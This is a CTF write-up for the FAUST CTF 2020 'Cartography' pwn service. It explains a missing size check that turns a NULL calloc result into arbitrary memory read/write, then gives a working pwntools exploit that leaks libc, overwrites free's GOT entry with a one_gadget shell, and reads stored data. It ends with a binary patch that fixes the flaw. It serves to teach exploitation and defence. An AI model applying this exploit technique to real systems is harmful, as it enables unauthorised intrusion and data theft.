+++
title = 'FAUST CTF 2020 — Cartography'
date = 2020-07-20T22:42:25+05:00
tags = ['ctf', 'writeup', 'pwn']
tldr = 'arbitrary write using malloc() primitive'
+++

[FAUST CTF 2020](https://ctftime.org/event/1000) was an online __attack-defense__ CTF, so all challenges during the CTF were presented in the form of network services — each service was listening some TCP port and constantly handling requests. If the service was a web-server, it was running over the HTTP protocol, but in another case it accepted a connection and transmitted data over the TCP protocol.

__Cartography__ is a TCP service, contains single binary file named `cartography` and `./data/` folder that contains any user data saved in the service. 

Write your own socket server is a bit painful, so it's normal to use additional network daemons (_inetd_, _xinetd_, _socat_, etc...) that listen a TCP socket and spawn a process on every connection. With this approach you don't need to analyze any network infrastructure code, it allows you to direct all your attention to the service logic.

Thus the given binary reads from stdin and writes into stdout as if we run it from a normal shell. But on the server side stdin and stdout file descriptors are connected with socket, the binary runs independently for each connection, and all users of the service don't conflict with each other. Let's try to run it from bash:

```sh
$ ./cartography 
                                     .........                                  
                            ..',;:;;:clc;cc:cc;'.....                           
                        .';:cllcloollcc:;::;;''',,;::;,..                       
                     .,cllloooooolllllllllllcc:::::::::c:;'.                    
                  .,coooooooddddddoooooooooolcc:::;;;;;,,;:;'.                  
                .;loodddddddddddddddooodddoollllcc::;;,''''',,..                
              .;cllloodddddddddddoodooooooolllccclllcc:;,'...'''..              
             .:clllllooooodxxkkkkxddooooooooolllccccccc:;,'..''',;'             
            ,lllooooooooodxkO0KK0Oxollooooooooooolllcllc::;,,,,,,;:,            
          .;clooddoooooodxxxkOOOxdollllooooooooooooolllc:::;;,,,,,;c;.          
          ,clodddooooooodddddodddoollloolloooooooooolc:::;::;,,,,,,,:;          
         'clooxkkxdoddooooooooooolllllllllllooooooool:;;;;;:;;;,,,,,;c'         
        .:loodkO0Odloooddoolllllcccllllllllloddddddoc:;,;,,;:::;,,,;;:;.        
        ,looodkO0Kkcloooooollllcccclllllllllooddddddoc:;:;,;ccc;;;;;:cc'        
       .:oddoox0Okxlloddddxdollcllcclooooolooooolllllc:::;,;:cc:::::cll;.       
       .coodooooolcccodkOO00Oxooddodddddxdooooollccccccc::::::ccc:ccccc;.       
       .coooolc:::::lodxO0000OkxxkOkxdddddooddoolllllllcllcccccccccccc:;.       
       .clooolccccccodddxkkk00OddkOkxxdddddddxxddddddolccclccccllllccc:;.       
       .cooooolcllooodxxddxkOOxllodxkOOOOOOOkxxdxxxxddooccccccoooooc:;;,.       
        :oodddoooloodxxkxdddddollodkOOOOOOOOkxddxxxxdooolllc:cllllcc:,,'        
        'odxxddooooodxO0OxddddooooodkOOOOOkxxddxxxkxxdolllc:;;:;:c::;''.        
        .cxxxxxddddddxxxkxdxxxdddxxxxxdddoodddxdodxkxdollcc;;;;::::;,,.         
         .lkkkkxxdxxkxooddxxxxxxxxxxdllccclooddolloxdoolcc:;;;;;;;:;,'.         
          'okkkkxxxkOkdolodddxxxxkOkoc::cccccllcccclllllc:;;,;;;:::;,.          
           'oxkkkkxkkkxxddoolloddkOOxoccccllllllc::::cc::;;,;;,;:::,.           
            .cdxxxxddddxkxddddodddddddollooollcccccccc:;;;,,;;;;:;'.            
              ,looddodooooodxxddddddddddooolc:::::::::;;;,,,,,,;,.              
               .,loooooollloddddddooolllccc:::;;;;;;;;,,,,,,,,,.                
                 .':ccllllllododddolc:;;;;::;;;;;;;;;,,''',,,..                 
                   ..,;:ccccllooooolc:;;;;,,;;;;;;;;;;,,;;,.                    
                      ..,;:ccccccclollcllcc:;;;;;:cllc:,..                      
                          ..',:ccccllllllcc::::::;,'...                         
                               ........'''......                                
                                                                                
           ______           __                               __                
          / ____/___ ______/ /_____  ____ __________ _____  / /_  __  __        
         / /   / __ `/ ___/ __/ __ \/ __ `/ ___/ __ `/ __ \/ __ \/ / / /        
        / /___/ /_/ / /  / /_/ /_/ / /_/ / /  / /_/ / /_/ / / / / /_/ /         
        \____/\__,_/_/   \__/\____/\__, /_/   \__,_/ .___/_/ /_/\__, /          
                                  /____/          /_/          /____/           

Options:
0. New Sector
1. Update Sector Data
2. Read Sector Data
3. Save Sector
4. Load Sector
5. Exit
>
```

It draws a nice planet, prints a menu and asks for a user input. Since it's a binary service, most likely it's a PWN, so I also downloaded `libc.so.6` from the vulnerable image belonging to our team:

```sh
$ file libc-2.28.so 
libc-2.28.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/l, BuildID[sha1]=18b9a9a8c523e5cfe5b5d946d605d09242f09798, for GNU/Linux 3.2.0, stripped

$ ./libc-2.28.so 
GNU C Library (Debian GLIBC 2.28-10) stable release version 2.28.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 8.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<http://www.debian.org/Bugs/>.
```

Let's start analyzing the binary. First we check for enabled security mitigations:

```sh
$ file cartography
cartography: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=957dd5021210d75153b252c7fd8baf6437192db2, stripped

$ checksec cartography
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As you see, stack canary and NX are enabled, but PIE is disabled and GOT table is rewritable. What does it mean? At least, we don't need to leak base address of the binary (it's fixed), so we can reuse all the code and imported functions. Also if we could rewrite some GOT entries, then we would intercept the execution flow when calling the imported function and jump into another function.

I will use IDA to reverse the binary. As you see above, there are several menu items for some actions. We input an integer, and it goes to switch/case operator inside the main function. After some analysis we could understand that there are two global variables: `current_chunk` (pointer) and `current_chunk_size` (integer). The entire binary does some operations with these two variables:

- when we create "New Sector", it frees `current_chunk`, allocates a new chunk (using calloc) with specified size and sets `current_chunk` to the new chunk and `current_chunk_size` to the size of the new chunk
- when we "Update Sector Data", it asks for `offset`, `data` and writes `data` in the `current_chunk` by the specified `offset`
- when we "Read Sector Data", it asks for `offset`, `size` and reads `size` bytes from the `current_chunk` by the specified `offset`
- when we "Save Sector", it just dumps the `current_chunk` data on the disk (it uses to store data in the service)
- when se "Load Sector", it just loads the chunk from the disk and sets `current_chunk` to this chunk (it uses to retrieve data from the service)

I will provide a pseudocode of the first three menu action:

```c++
case 0u: // New Sector
    puts("Enter the sector's size:");
    if (!fgets(&buf, 32, stdin))
        exit(1);
    sector_size = strtoll(&buf, &endptr, 10);
    if (*endptr != 0 && *endptr != 10 || sector_size >> 63)
    {
        printf("Invalid size for sector: %s\n", &buf);
    }
    else
    {
        free(current_chunk);
        current_size = sector_size;
        current_chunk = calloc(1uLL, size);
        puts("Sector created!");
    }
    break;

case 1u: // Update Sector Data
    puts("Where do you want to write?");
    if (!fgets(&buf, 32, stdin))
        exit(1);
    offset = strtol(&buf, 0LL, 10);
    puts("How much do you want to write?");
    if (!fgets(&buf, 32, stdin))
        exit(1);
    size = strtol(&buf, 0LL, 10);
    if (offset < 0 || size < 0 || offset + size > current_size)
    {
        puts("Invalid range");
    }
    else
    {
        puts("Enter your sensor data:");
        if (size != fread((char *)current_chunk + offset, 1uLL, size, stdin))
            exit(1);
        fgetc(stdin);
    }
    break;

case 2u: // Read Sector Data
    puts("Where do you want to read?");
    if (!fgets(&buf, 32, stdin))
        exit(1);
    offset = strtol(&buf, 0LL, 10);
    puts("How much do you want to read?");
    if (!fgets(&str_buf, 32, stdin))
        exit(1);
    size = strtol(&buf, 0LL, 10);
    if (offset < 0 || size < 0 || offset + size > current_size)
        puts("Invalid range");
    fwrite((char *)current_chunk + offset, size, 1uLL, stdout);
    _IO_putc(10, stdout);
    break;
```

As you see, there is a little bug in "New Sector" action:

```c++
if (*endptr != 0 && *endptr != 10 || sector_size >> 63)
```

If `sector_size` < 2 ** 63, then `sector_size >> 63` is always false, so there is no check for a new chunk size. Remember a bit how malloc works (calloc uses malloc inside): if the requested size is a very big (bigger than all available memory, so the operating system can not allocate such big chunk), malloc returns NULL. 

__Example__: `malloc(999999999999999999)` will return `NULL` if your computer does not have 931322574 gigabytes of RAM. But 999999999999999999 is still lower than 2 ** 63, so we can request a chunk with that size.

When we get NULL pointer, there is no checks for NULL, and we could read and write data on arbitrary location (using `offset` value). Using this method, we could leak a libc address from the GOT table. And then, using this method again, we could rewrite any function pointer inside the GOT table.

What function we want to execute? There is a helpful tool called [one_gadget](https://github.com/david942j/one_gadget). It searches over the libc and find a code which spawns a shell. We could use that tool and find a gadget to spawn a shell easily.

So my exploitation way was:

- request a chunk with a huge size (ex. 999999999999999999)
- leak an address of `free` function and get libc base address
- calculate the address of `one_gadget`
- rewrite `free` function in GOT table with `one_gadget`
- request a new chunk to call free function and execute `one_gadget`
- in the spawned shell read `./data/` directory and get all secret data

Example sploit:

```python
#!/usr/bin/env python3.7

import re
import sys

from pwn import *


IP = sys.argv[1]
PORT = 6666


def main(io):
    free_got = 0x603018
    io.sendline(b'0')
    io.sendline(str(10).encode())
    io.sendline(b'0')
    io.sendline(str(999999999999999999).encode())
    io.sendline(b'2')
    io.sendline(str(free_got).encode())
    io.sendline(str(8).encode())
    io.recvuntil(b'How much do you want to read?\n')
    free_libc = u64(io.recv(8))
    libc_base = free_libc - 0x849a0
    print('libc_base @ 0x%x' % libc_base)
    one_gadget = 0xe5456
    io.sendline(b'1')
    io.sendline(str(free_got).encode())
    io.sendline(str(8).encode())
    io.sendline(p64(libc_base + one_gadget))
    io.sendline(b'0')
    io.sendline(b'10')
    io.interactive()


if __name__ == '__main__':
    with remote(IP, PORT) as io:
        main(io)
```

How to fix? We need to change invalid check to valid check, for example `sector_size > 0xFFFF`:

```c++
if (*endptr != 0 && *endptr != 10 || sector_size > 0xFFFF)
```

Let's look to assembler. Here is a code that's checking the size:

```
.text:0000000000400DA8                 call    _strtoll
.text:0000000000400DAD                 mov     rdx, [rsp+118h+endptr]
.text:0000000000400DB2                 movzx   edx, byte ptr [rdx]
.text:0000000000400DB5                 cmp     dl, 0Ah
.text:0000000000400DB8                 setnz   cl
.text:0000000000400DBB                 test    dl, dl
.text:0000000000400DBD                 setnz   dl
.text:0000000000400DC0                 test    cl, dl
.text:0000000000400DC2                 jnz     loc_400E5B
.text:0000000000400DC8                 mov     rdx, rax
.text:0000000000400DCB                 shr     rdx, 3Fh
.text:0000000000400DCF                 test    dl, dl
.text:0000000000400DD1                 jnz     loc_400E5B
.text:0000000000400DD7                 mov     rdi, rbp        ; ptr
.text:0000000000400DDA                 mov     [rsp+118h+size], rax
.text:0000000000400DDF                 call    _free
.text:0000000000400DE4                 mov     rax, [rsp+118h+size]
.text:0000000000400DE9                 mov     edi, 1          ; nmemb
.text:0000000000400DEE                 mov     rsi, rax        ; size
.text:0000000000400DF1                 mov     [rsp+118h+ptr], rax
.text:0000000000400DF6                 call    _calloc
```

We need to change some bytes to add `cmp` with `0xFFFF`:

```
.text:0000000000400DA8                 call    _strtoll
.text:0000000000400DAD                 mov     rdx, [rsp+118h+endptr]
.text:0000000000400DB2                 movzx   edx, byte ptr [rdx]
.text:0000000000400DB5                 cmp     dl, 0Ah
.text:0000000000400DB8                 setnz   cl
.text:0000000000400DBB                 test    dl, dl
.text:0000000000400DBD                 setnz   dl
.text:0000000000400DC0                 test    cl, dl
.text:0000000000400DC2                 jnz     loc_400E5B
.text:0000000000400DC8                 cmp     rax, 0FFFFh
.text:0000000000400DCE                 nop
.text:0000000000400DCF                 nop
.text:0000000000400DD0                 nop
.text:0000000000400DD1                 jg      loc_400E5B
.text:0000000000400DD7                 mov     rdi, rbp
.text:0000000000400DDA                 mov     [rsp+118h+size], rax
.text:0000000000400DDF                 call    _free
.text:0000000000400DE4                 mov     rax, [rsp+118h+size]
.text:0000000000400DE9                 mov     edi, 1          ; nmemb
.text:0000000000400DEE                 mov     rsi, rax        ; size
.text:0000000000400DF1                 mov     [rsp+118h+current_size], rax
.text:0000000000400DF6                 call    _calloc
```

And now our check becomes correct:

```
Options:
0. New Sector
1. Update Sector Data
2. Read Sector Data
3. Save Sector
4. Load Sector
5. Exit
> 0                 
Enter the sector's size:
999999999999999999
Invalid size for sector: 999999999999999999

Options:
0. New Sector
1. Update Sector Data
2. Read Sector Data
3. Save Sector
4. Load Sector
5. Exit
>
```
